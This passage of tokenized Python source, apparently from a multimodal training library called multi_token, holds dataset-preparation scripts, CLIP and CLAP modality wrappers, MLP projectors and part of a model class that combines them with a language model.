gen ( rows ) : <EOL> for row in rows : <EOL> try : <EOL> img_path = row [ "<STR_LIT>" ] <EOL> except KeyError : <EOL> continue <EOL> convo_text = repr ( row [ "<STR_LIT>" ] ) . lower ( ) <EOL> if "<STR_LIT>" in img_path or any ( w in convo_text for w in EXCLUDE_WORDS ) : <EOL> continue <EOL> fn = os . path . join ( args . image_folder , _fix_path ( img_path ) ) <EOL> if not os . path . exists ( fn ) : <EOL> print ( "<STR_LIT>" , fn ) <EOL> continue <EOL> yield { <EOL> "<STR_LIT>" : str ( row [ "<STR_LIT>" ] ) , <EOL> "<STR_LIT>" : [ fn ] , <EOL> "<STR_LIT>" : _convert_convo ( row [ "<STR_LIT>" ] ) , <EOL> } <EOL> ds = Dataset . from_generator ( gen , gen_kwargs = { "<STR_LIT>" : rows } , num_proc = args . num_proc ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str , action = "<STR_LIT>" ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> from typing import Dict , List , Tuple , Optional <EOL> import torch <EOL> import torch . nn as nn <EOL> from transformers import CLIPVisionModel , CLIPImageProcessor <EOL> from PIL import Image <EOL> from multi_token . modalities . base_modality import Modality <EOL> from multi_token . modalities . projectors import ( <EOL> build_patch_mlp_projector , <EOL> build_mlp_vector_projector , <EOL> ) <EOL> from multi_token . data_tools import load_image <EOL> PATCH_LAYER = - <NUM_LIT> <EOL> OUTPUT_LAYER = - <NUM_LIT> <EOL> OUTPUT_EMB_SIZE = <NUM_LIT> <EOL> class CLIPVisionModule ( nn . Module ) : <EOL> def __init__ ( self , model_name_or_path : str , feature_layer : int = PATCH_LAYER ) : <EOL> super ( ) . __init__ ( ) <EOL> self . feature_layer = feature_layer <EOL> self . model_name_or_path = model_name_or_path <EOL> self . image_processor = None <EOL> self . image_model = None <EOL> self . load_model ( ) <EOL> def load_model ( self ) : <EOL> self . image_processor = CLIPImageProcessor . from_pretrained ( <EOL> self . model_name_or_path <EOL> ) <EOL> self . image_model = CLIPVisionModel . from_pretrained ( self . model_name_or_path ) <EOL> self . image_model . requires_grad_ ( False ) <EOL> @ torch . no_grad ( ) <EOL> def forward ( self , images ) -> torch . Tensor : <EOL> if self . feature_layer == PATCH_LAYER : <EOL> image_forward_outs = self . image_model ( <EOL> images . to ( device = self . device , dtype = self . dtype ) , <EOL> output_hidden_states = True , <EOL> ) <EOL> image_features = image_forward_outs . hidden_states [ self . feature_layer ] <EOL> image_features = image_features [ : , <NUM_LIT> : ] . to ( images . dtype ) <EOL> else : <EOL> image_forward_outs = self . image_model ( <EOL> images . to ( device = self . device , dtype = self . dtype ) , <EOL> ) <EOL> image_features = image_forward_outs . pooler_output . to ( images . dtype ) . view ( <EOL> - <NUM_LIT> , <NUM_LIT> , OUTPUT_EMB_SIZE <EOL> ) <EOL> return image_features <EOL> @ property <EOL> def dtype ( self ) : <EOL> return self . image_model . dtype <EOL> @ property <EOL> def device ( self ) : <EOL> return self . image_model . device <EOL> @ property <EOL> def config ( self ) : <EOL> return self . image_model . config <EOL> @ property <EOL> def hidden_size ( self ) : <EOL> return self . config . hidden_size <EOL> @ property <EOL> def num_patches ( self ) : <EOL> return ( self . config . image_size // self . config . patch_size ) ** <NUM_LIT> <EOL> def _expand2square ( pil_img : Image , background_color : Tuple ) -> Image : <EOL> width , height = pil_img . size <EOL> if width == height : <EOL> return pil_img <EOL> elif width > height : <EOL> result = Image . new ( pil_img . mode , ( width , width ) , background_color ) <EOL> result . paste ( pil_img , ( <NUM_LIT> , ( width - height ) // <NUM_LIT> ) ) <EOL> return result <EOL> else : <EOL> result = Image . new ( pil_img . mode , ( height , height ) , background_color ) <EOL> result . paste ( pil_img , ( ( height - width ) // <NUM_LIT> , <NUM_LIT> ) ) <EOL> return result <EOL> class CLIPVisionModality ( Modality ) : <EOL> def __init__ ( <EOL> self , <EOL> model_name_or_path : str = "<STR_LIT>" , <EOL> pad_non_square_images : bool = False , <EOL> num_projector_layers : int = <NUM_LIT> , <EOL> feature_layer : int = PATCH_LAYER , <EOL> num_tokens_output : Optional [ int ] = None , <EOL> ) : <EOL> if feature_layer not in [ PATCH_LAYER , OUTPUT_LAYER ] : <EOL> raise ValueError ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> if ( feature_layer == PATCH_LAYER ) != ( num_tokens_output is None ) : <EOL> raise ValueError ( <EOL> "<STR_LIT>" <EOL> ) <EOL> self . model_name_or_path = model_name_or_path <EOL> self . module = CLIPVisionModule ( <EOL> model_name_or_path = self . model_name_or_path , feature_layer = feature_layer <EOL> ) <EOL> self . pad_non_square_images = pad_non_square_images <EOL> self . num_projector_layers = num_projector_layers <EOL> self . num_tokens_output = num_tokens_output <EOL> def build_projector ( self , lm_hidden_size : int ) -> nn . Module : <EOL> if self . module . feature_layer == PATCH_LAYER : <EOL> return build_patch_mlp_projector ( <EOL> self . module . hidden_size , <EOL> lm_hidden_size , <EOL> num_layers = self . num_projector_layers , <EOL> ) <EOL> else : <EOL> return build_mlp_vector_projector ( <EOL> input_hidden_size = OUTPUT_EMB_SIZE , <EOL> lm_hidden_size = lm_hidden_size , <EOL> num_layers = self . num_projector_layers , <EOL> num_tokens = self . num_tokens_output , <EOL> ) <EOL> @ property <EOL> def name ( self ) -> str : <EOL> return "<STR_LIT>" <EOL> @ property <EOL> def token ( self ) -> str : <EOL> return "<STR_LIT>" <EOL> @ property <EOL> def data_key ( self ) -> str : <EOL> return "<STR_LIT>" <EOL> @ property <EOL> def token_width ( self ) -> int : <EOL> if self . module . feature_layer == PATCH_LAYER : <EOL> return self . module . num_patches <EOL> else : <EOL> return self . num_tokens_output <EOL> def to ( self , dtype : torch . dtype , device : torch . device ) -> "<STR_LIT>" : <EOL> self . module . to ( dtype = dtype , device = device ) <EOL> return self <EOL> def preprocess_rows ( self , rows : List [ Dict ] ) -> List [ Optional [ torch . Tensor ] ] : <EOL> row_values = [ ] <EOL> for row in rows : <EOL> images = [ ] <EOL> for image_fn in row [ self . data_key ] : <EOL> image_obj = load_image ( image_fn ) <EOL> if self . pad_non_square_images : <EOL> image_obj = _expand2square ( <EOL> image_obj , <EOL> tuple ( <EOL> int ( x * <NUM_LIT> ) for x in self . module . image_processor . image_mean <EOL> ) , <EOL> ) <EOL> image = self . module . image_processor . preprocess ( <EOL> image_obj , return_tensors = "<STR_LIT>" <EOL> ) [ "<STR_LIT>" ] [ <NUM_LIT> ] <EOL> images . append ( image ) <EOL> row_values . append ( torch . stack ( images ) if len ( images ) > <NUM_LIT> else None ) <EOL> return row_values <EOL> @ torch . no_grad ( ) <EOL> def forward ( self , encoded_values : List [ torch . Tensor ] ) -> List [ torch . Tensor ] : <EOL> image_features = [ ] <EOL> for image_batch in encoded_values : <EOL> image_features . append ( self . module . forward ( image_batch ) ) <EOL> return image_features <EOL> </s>
<s> import transformers <EOL> import logging <EOL> from multi_token . training import ( <EOL> TrainingArguments , <EOL> ModelArguments , <EOL> train_for_modalities , <EOL> ) <EOL> from multi_token . training_data import ( <EOL> DataArguments , <EOL> ) <EOL> from multi_token . language_models import LANGUAGE_MODEL_NAME_TO_CLASS <EOL> from multi_token . modalities import MODALITY_BUILDERS <EOL> if __name__ == "<STR_LIT>" : <EOL> logging . getLogger ( ) . setLevel ( logging . INFO ) <EOL> parser = transformers . HfArgumentParser ( <EOL> ( TrainingArguments , ModelArguments , DataArguments ) <EOL> ) <EOL> training_args , model_args , data_args , _ = parser . parse_args_into_dataclasses ( <EOL> return_remaining_strings = True <EOL> ) <EOL> modalities = MODALITY_BUILDERS [ model_args . modality_builder ] ( ) <EOL> model_cls = LANGUAGE_MODEL_NAME_TO_CLASS [ model_args . model_cls ] <EOL> train_for_modalities ( model_cls , training_args , model_args , data_args , modalities ) <EOL> </s>
<s> from typing import List <EOL> import argparse <EOL> import json <EOL> import os <EOL> import random <EOL> import openai <EOL> from datasets import Dataset , load_dataset <EOL> from multi_token . constants import ROLE_ASSISTANT , ROLE_USER <EOL> PROMPT = <EOL> PRETRAIN_PHRASES = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> OPENAI_TOOLS = [ <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> } , <EOL> "<STR_LIT>" : [ "<STR_LIT>" ] , <EOL> } , <EOL> } , <EOL> } <EOL> ] <EOL> def _build_convo ( row ) -> List : <EOL> client = openai . Client ( ) <EOL> captions = [ row [ "<STR_LIT>" ] ] <EOL> sounds = [ row [ "<STR_LIT>" ] ] <EOL> captions_text = "<STR_LIT>" . join ( [ f'<STR_LIT>' for i , cap in enumerate ( captions ) ] ) <EOL> prompt = PROMPT . format ( captions = captions_text ) . strip ( ) <EOL> completion = client . chat . completions . create ( <EOL> model = "<STR_LIT>" , <EOL> messages = [ { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : prompt } ] , <EOL> tools = OPENAI_TOOLS , <EOL> tool_choice = { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : { "<STR_LIT>" : "<STR_LIT>" } } , <EOL> ) <EOL> resp = json . loads ( completion . choices [ <NUM_LIT> ] . message . tool_calls [ <NUM_LIT> ] . function . arguments ) <EOL> caption = resp [ "<STR_LIT>" ] <EOL> q = random . choice ( PRETRAIN_PHRASES ) <EOL> example = { <EOL> "<STR_LIT>" : sounds , <EOL> "<STR_LIT>" : [ <EOL> { <EOL> "<STR_LIT>" : ROLE_USER , <EOL> "<STR_LIT>" : q , <EOL> } , <EOL> { <EOL> "<STR_LIT>" : ROLE_ASSISTANT , <EOL> "<STR_LIT>" : caption , <EOL> } , <EOL> ] , <EOL> } <EOL> return example <EOL> def main ( args ) : <EOL> data = load_dataset ( "<STR_LIT>" , split = "<STR_LIT>" ) <EOL> os . makedirs ( args . cache_folder , exist_ok = True ) <EOL> def gen ( seeds ) : <EOL> cache = open ( <EOL> os . path . join ( args . cache_folder , f"<STR_LIT>" ) , "<STR_LIT>" <EOL> ) <EOL> for s in seeds : <EOL> selected_row = data [ s ] <EOL> try : <EOL> example = _build_convo ( selected_row ) <EOL> cache . write ( json . dumps ( example ) + "<STR_LIT>" ) <EOL> yield example <EOL> except Exception as e : <EOL> print ( e ) <EOL> continue <EOL> cache . close ( ) <EOL> idxs = list ( range ( len ( data ) ) ) <EOL> random . shuffle ( idxs ) <EOL> ds = Dataset . from_generator ( <EOL> gen , <EOL> num_proc = args . num_proc , <EOL> gen_kwargs = { "<STR_LIT>" : idxs } , <EOL> ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = str , <EOL> default = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = str , <EOL> default = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> import torch . nn as nn <EOL> import torch <EOL> def build_patch_mlp_projector ( <EOL> input_hidden_size : int , lm_hidden_size : int , num_layers : int <EOL> ) -> nn . Module : <EOL> modules = [ nn . Linear ( input_hidden_size , lm_hidden_size ) ] <EOL> for _ in range ( <NUM_LIT> , num_layers ) : <EOL> modules . append ( nn . GELU ( ) ) <EOL> modules . append ( nn . Linear ( lm_hidden_size , lm_hidden_size ) ) <EOL> return nn . Sequential ( * modules ) <EOL> class _MLPVectorProjector ( nn . Module ) : <EOL> def __init__ ( <EOL> self , input_hidden_size : int , lm_hidden_size : int , num_layers : int , width : int <EOL> ) : <EOL> super ( _MLPVectorProjector , self ) . __init__ ( ) <EOL> self . mlps = nn . ModuleList ( ) <EOL> for _ in range ( width ) : <EOL> mlp = [ nn . Linear ( input_hidden_size , lm_hidden_size ) ] <EOL> for _ in range ( <NUM_LIT> , num_layers ) : <EOL> mlp . append ( nn . GELU ( ) ) <EOL> mlp . append ( nn . Linear ( lm_hidden_size , lm_hidden_size ) ) <EOL> self . mlps . append ( nn . Sequential ( * mlp ) ) <EOL> def forward ( self , x ) : <EOL> return torch . cat ( [ mlp ( x ) for mlp in self . mlps ] , dim = - <NUM_LIT> ) <EOL> def build_mlp_vector_projector ( <EOL> input_hidden_size : int , lm_hidden_size : int , num_layers : int , num_tokens : int <EOL> ) : <EOL> return _MLPVectorProjector ( <EOL> input_hidden_size , lm_hidden_size , num_layers , num_tokens <EOL> ) <EOL> </s>
<s> from typing import List <EOL> import argparse <EOL> import re <EOL> import glob <EOL> import json <EOL> from datasets import load_dataset <EOL> from datasets import Dataset <EOL> from multi_token . constants import ROLE_ASSISTANT , ROLE_USER <EOL> from multi_token . modalities . document_gte import ( <EOL> split_text_into_documents , <EOL> ) <EOL> TEMP_TOKEN = "<STR_LIT>" <EOL> LONG_ALPACA_REGEXES = [ <EOL> ( <EOL> r"<STR_LIT>" , <EOL> lambda m : m . group ( <NUM_LIT> ) , <EOL> lambda m : f"<STR_LIT>" , <EOL> ) , <EOL> ( <EOL> r"<STR_LIT>" , <EOL> lambda m : m . group ( <NUM_LIT> ) , <EOL> lambda m : f"<STR_LIT>" , <EOL> ) , <EOL> ( <EOL> r"<STR_LIT>" , <EOL> lambda m : m . group ( <NUM_LIT> ) , <EOL> lambda m : f"<STR_LIT>" , <EOL> ) , <EOL> ( <EOL> r"<STR_LIT>" , <EOL> lambda m : m . group ( <NUM_LIT> ) , <EOL> lambda m : f"<STR_LIT>" , <EOL> ) , <EOL> ] <EOL> LONG_DATA_REGEXES = [ <EOL> ( <EOL> r"<STR_LIT>" , <EOL> lambda m : m . group ( <NUM_LIT> ) . strip ( ) , <EOL> lambda m : f"<STR_LIT>" , <EOL> lambda m : m . group ( <NUM_LIT> ) . strip ( ) , <EOL> ) , <EOL> ( <EOL> r"<STR_LIT>" , <EOL> lambda m : m . group ( <NUM_LIT> ) . strip ( ) , <EOL> lambda m : f"<STR_LIT>" , <EOL> lambda m : m . group ( <NUM_LIT> ) . strip ( ) , <EOL> ) , <EOL> ] <EOL> def _write_long_alpaca_convo ( row , max_document_chunks ) -> List : <EOL> doc_text = None <EOL> prompt = None <EOL> for regex , get_doc , get_prompt in LONG_ALPACA_REGEXES : <EOL> match = re . match ( regex , row [ "<STR_LIT>" ] ) <EOL> if match : <EOL> doc_text = get_doc ( match ) <EOL> prompt = get_prompt ( match ) . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> break <EOL> if doc_text is None and row [ "<STR_LIT>" ] : <EOL> doc_text = row [ "<STR_LIT>" ] <EOL> prompt = row [ "<STR_LIT>" ] + f"<STR_LIT>" <EOL> if doc_text is None : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> docs = split_text_into_documents ( doc_text ) <EOL> if len ( docs ) > max_document_chunks : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> example = { <EOL> "<STR_LIT>" : "<STR_LIT>" + str ( hash ( row [ "<STR_LIT>" ] ) ) , <EOL> "<STR_LIT>" : docs , <EOL> } <EOL> example [ "<STR_LIT>" ] = [ <EOL> { <EOL> "<STR_LIT>" : ROLE_USER , <EOL> "<STR_LIT>" : prompt . replace ( TEMP_TOKEN , "<STR_LIT>" * len ( docs ) ) , <EOL> } , <EOL> { <EOL> "<STR_LIT>" : ROLE_ASSISTANT , <EOL> "<STR_LIT>" : row [ "<STR_LIT>" ] . replace ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> } , <EOL> ] <EOL> return example <EOL> def _write_long_data_collections_convo ( row , max_document_chunks ) -> List : <EOL> doc_text = None <EOL> prompt = None <EOL> answer = None <EOL> for regex , get_doc , get_prompt , get_answer in LONG_DATA_REGEXES : <EOL> match = re . match ( regex , row [ "<STR_LIT>" ] ) <EOL> if match : <EOL> doc_text = get_doc ( match ) <EOL> prompt = get_prompt ( match ) <EOL> answer = get_answer ( match ) . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> break <EOL> if not doc_text or not prompt or not answer : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> docs = split_text_into_documents ( doc_text ) <EOL> if len ( docs ) > max_document_chunks : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> example = { <EOL> "<STR_LIT>" : "<STR_LIT>" + str ( hash ( row [ "<STR_LIT>" ] ) ) , <EOL> "<STR_LIT>" : docs , <EOL> } <EOL> example [ "<STR_LIT>" ] = [ <EOL> { <EOL> "<STR_LIT>" : ROLE_USER , <EOL> "<STR_LIT>" : prompt . replace ( TEMP_TOKEN , "<STR_LIT>" * len ( docs ) ) , <EOL> } , <EOL> { <EOL> "<STR_LIT>" : ROLE_ASSISTANT , <EOL> "<STR_LIT>" : answer , <EOL> } , <EOL> ] <EOL> return example <EOL> def main ( args ) : <EOL> long_alpaca = load_dataset ( args . long_alpaca_path , "<STR_LIT>" ) [ "<STR_LIT>" ] <EOL> def gen ( ) : <EOL> for row in long_alpaca : <EOL> try : <EOL> yield _write_long_alpaca_convo ( row , args . max_document_chunks ) <EOL> except ValueError : <EOL> continue <EOL> for long_collection_fn in glob . iglob ( args . long_collections_glob ) : <EOL> with open ( long_collection_fn ) as f : <EOL> for line in f : <EOL> row = json . loads ( line ) <EOL> try : <EOL> yield _write_long_data_collections_convo ( <EOL> row , args . max_document_chunks <EOL> ) <EOL> except ValueError : <EOL> continue <EOL> ds = Dataset . from_generator ( gen ) <EOL> ds = ds . shuffle ( seed = <NUM_LIT> ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( "<STR_LIT>" , type = str , default = "<STR_LIT>" ) <EOL> parser . add_argument ( "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> from typing import Dict , List , Optional <EOL> import torch <EOL> import torch . nn as nn <EOL> from transformers import ClapModel , ClapProcessor <EOL> from multi_token . data_tools import load_audio <EOL> from multi_token . modalities . base_modality import Modality <EOL> from multi_token . modalities . projectors import ( <EOL> build_mlp_vector_projector , <EOL> ) <EOL> OUTPUT_EMB_SIZE = <NUM_LIT> <EOL> class CLAPAudioModule ( nn . Module ) : <EOL> def __init__ ( self , model_name_or_path : str ) : <EOL> super ( ) . __init__ ( ) <EOL> self . model_name_or_path = model_name_or_path <EOL> self . model = None <EOL> self . processor = None <EOL> self . load_model ( ) <EOL> def load_model ( self ) : <EOL> self . model = ClapModel . from_pretrained ( self . model_name_or_path ) <EOL> self . processor = ClapProcessor . from_pretrained ( self . model_name_or_path ) <EOL> self . model . requires_grad_ ( False ) <EOL> @ torch . no_grad ( ) <EOL> def forward ( self , audios ) -> torch . Tensor : <EOL> embs = [ ] <EOL> for audio_features in audios : <EOL> features = self . model . get_audio_features ( <EOL> input_features = audio_features [ "<STR_LIT>" ] . to ( torch . float32 ) , <EOL> is_longer = audio_features [ "<STR_LIT>" ] , <EOL> ) <EOL> embs . append ( features ) <EOL> embs = torch . stack ( embs ) <EOL> return embs . view ( - <NUM_LIT> , <NUM_LIT> , OUTPUT_EMB_SIZE ) <EOL> @ property <EOL> def dtype ( self ) : <EOL> return self . model . dtype <EOL> @ property <EOL> def device ( self ) : <EOL> return self . model . device <EOL> class CLAPAudioModality ( Modality ) : <EOL> def __init__ ( <EOL> self , <EOL> model_name_or_path : str = "<STR_LIT>" , <EOL> num_projector_layers : int = <NUM_LIT> , <EOL> num_tokens_output : int = <NUM_LIT> , <EOL> ) : <EOL> self . model_name_or_path = model_name_or_path <EOL> self . module = CLAPAudioModule ( model_name_or_path = self . model_name_or_path ) <EOL> self . num_projector_layers = num_projector_layers <EOL> self . num_tokens_output = num_tokens_output <EOL> self . dtype = torch . float32 <EOL> def build_projector ( self , lm_hidden_size : int ) -> nn . Module : <EOL> return build_mlp_vector_projector ( <EOL> input_hidden_size = OUTPUT_EMB_SIZE , <EOL> lm_hidden_size = lm_hidden_size , <EOL> num_layers = self . num_projector_layers , <EOL> num_tokens = self . num_tokens_output , <EOL> ) <EOL> @ property <EOL> def name ( self ) -> str : <EOL> return "<STR_LIT>" <EOL> @ property <EOL> def token ( self ) -> str : <EOL> return "<STR_LIT>" <EOL> @ property <EOL> def data_key ( self ) -> str : <EOL> return "<STR_LIT>" <EOL> @ property <EOL> def token_width ( self ) -> int : <EOL> return self . num_tokens_output <EOL> def to ( self , dtype : torch . dtype , device : torch . device ) -> "<STR_LIT>" : <EOL> self . dtype = dtype <EOL> self . module . to ( device = device ) <EOL> return self <EOL> def preprocess_rows ( self , rows : List [ Dict ] ) -> List [ Optional [ Dict ] ] : <EOL> row_values = [ ] <EOL> for row in rows : <EOL> audios = [ ] <EOL> for audio_dict in row [ self . data_key ] : <EOL> audio_dict = load_audio ( <EOL> audio_dict , <EOL> target_sampling_rate = self . module . processor . feature_extractor . sampling_rate , <EOL> ) <EOL> audio_processed = self . module . processor ( <EOL> audios = audio_dict [ "<STR_LIT>" ] , <EOL> return_tensors = "<STR_LIT>" , <EOL> sampling_rate = audio_dict [ "<STR_LIT>" ] , <EOL> ) <EOL> audios . append ( audio_processed ) <EOL> row_values . append ( audios ) <EOL> return row_values <EOL> @ torch . no_grad ( ) <EOL> def forward ( self , encoded_values : List [ torch . Tensor ] ) -> List [ torch . Tensor ] : <EOL> audio_features = [ ] <EOL> for audio_batch in encoded_values : <EOL> audio_features . append ( self . module . forward ( audio_batch ) . to ( dtype = self . dtype ) ) <EOL> return audio_features <EOL> </s>
<s> from multi_token . language_models . mistral import ( <EOL> MistralLMMForCausalLM , <EOL> ) <EOL> LANGUAGE_MODEL_CLASSES = [ MistralLMMForCausalLM ] <EOL> LANGUAGE_MODEL_NAME_TO_CLASS = { cls . __name__ : cls for cls in LANGUAGE_MODEL_CLASSES } <EOL> </s>
<s> from typing import List <EOL> import random <EOL> import argparse <EOL> import json <EOL> import os <EOL> from datasets import Dataset <EOL> from multi_token . constants import ROLE_ASSISTANT , ROLE_USER <EOL> TYPES = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> REPLACEMENTS = { <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> } <EOL> TEMP_TOKEN = "<STR_LIT>" <EOL> def _convert_convo ( convo ) -> List : <EOL> type_idx = TYPES . index ( random . choice ( TYPES ) ) <EOL> msgs = [ ] <EOL> for m in convo : <EOL> content = m [ "<STR_LIT>" ] . replace ( "<STR_LIT>" , TEMP_TOKEN ) <EOL> for k , v in REPLACEMENTS . items ( ) : <EOL> content = content . replace ( k , v [ type_idx ] ) <EOL> content = content . replace ( TEMP_TOKEN , "<STR_LIT>" ) <EOL> msgs . append ( <EOL> { <EOL> "<STR_LIT>" : { "<STR_LIT>" : ROLE_ASSISTANT , "<STR_LIT>" : ROLE_USER } [ m [ "<STR_LIT>" ] ] , <EOL> "<STR_LIT>" : content , <EOL> } <EOL> ) <EOL> return msgs <EOL> def main ( args ) : <EOL> rows = [ ] <EOL> for json_fn in args . llava_json : <EOL> with open ( json_fn ) as f : <EOL> rows . extend ( json . load ( f ) ) <EOL> def gen ( rows ) : <EOL> for row in rows : <EOL> img_path = row [ "<STR_LIT>" ] <EOL> fn = os . path . join ( args . image_folder , img_path ) <EOL> if not os . path . exists ( fn ) : <EOL> print ( "<STR_LIT>" , fn ) <EOL> continue <EOL> yield { <EOL> "<STR_LIT>" : str ( row [ "<STR_LIT>" ] ) , <EOL> "<STR_LIT>" : [ fn ] , <EOL> "<STR_LIT>" : _convert_convo ( row [ "<STR_LIT>" ] ) , <EOL> } <EOL> ds = Dataset . from_generator ( gen , gen_kwargs = { "<STR_LIT>" : rows } , num_proc = args . num_proc ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str , action = "<STR_LIT>" ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> import argparse <EOL> from datasets import load_dataset , concatenate_datasets <EOL> def main ( args ) : <EOL> dss = [ ] <EOL> for dataset_path in args . dataset : <EOL> dataset = load_dataset ( dataset_path , split = "<STR_LIT>" , data_files = "<STR_LIT>" ) <EOL> dss . append ( dataset ) <EOL> ds = concatenate_datasets ( dss ) <EOL> ds = ds . shuffle ( ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str , action = "<STR_LIT>" ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> from typing import List , Dict <EOL> from abc import ABC , abstractmethod <EOL> from torch . nn . functional import conv1d <EOL> import torch <EOL> import logging <EOL> from multi_token . modalities . base_modality import Modality <EOL> class LMMMetaModel : <EOL> def __init__ ( self , config ) : <EOL> super ( LMMMetaModel , self ) . __init__ ( config ) <EOL> def _load_projector_weights ( self , weights : Dict ) : <EOL> weights = { <EOL> ( k [ <NUM_LIT> : ] if k . startswith ( "<STR_LIT>" ) else k ) : v <EOL> for k , v in weights . items ( ) <EOL> } <EOL> logging . info ( f"<STR_LIT>" ) <EOL> load_result = self . load_state_dict ( weights , strict = False ) <EOL> assert ( <EOL> len ( load_result . unexpected_keys ) == <NUM_LIT> <EOL> ) , "<STR_LIT>" <EOL> def initialize_pretrained_modules ( self , modalities : List [ Modality ] , weights : Dict ) : <EOL> for m in modalities : <EOL> projector = m . build_projector ( self . config . hidden_size ) <EOL> setattr ( self , m . name + "<STR_LIT>" , projector ) <EOL> self . _load_projector_weights ( weights ) <EOL> def initialize_modules ( self , modalities : List [ Modality ] , weights : Dict ) : <EOL> names = [ m . name for m in modalities ] <EOL> self . config . modalities = names <EOL> for m in modalities : <EOL> projector = m . build_projector ( self . config . hidden_size ) <EOL> setattr ( self , m . name + "<STR_LIT>" , projector ) <EOL> self . _load_projector_weights ( weights ) <EOL> class LMMMetaForCausalLM ( ABC ) : <EOL> @ abstractmethod <EOL> def get_model ( self ) -> "<STR_LIT>" : <EOL> pass <EOL> def prepare_inputs_labels_for_multimodal ( <EOL> self , input_ids , attention_mask , past_key_values , labels , ** kwargs <EOL> ) : <EOL> model = self . get_model ( ) <EOL> batch_size , seq_len = input_ids . shape <EOL> inputs_embeds = torch . zeros ( <EOL> ( batch_size , seq_len , self . config . hidden_size ) , <EOL> dtype = self . dtype , <EOL> device = self . device , <EOL> ) <EOL> projected_tensors = [ ] <EOL> if past_key_values is None : <EOL> for m in self . modalities : <EOL> m_vals = m . forward ( kwargs . get ( m . name ) ) <EOL> mp_vals = [ ] <EOL> proj = getattr ( model , m . name + "<STR_LIT>" ) <EOL> for m_val in m_vals : <EOL> mp_vals . append ( proj ( m_val ) ) <EOL> assert all ( <EOL> mp_val . shape [ <NUM_LIT> : ] == ( m . token_width , self . config . hidden_size ) <EOL> for mp_val in mp_vals <EOL> ) , ( <EOL> "<STR_LIT>" <EOL> + str ( [ mp_val . shape [ <NUM_LIT> : ] for mp_val in 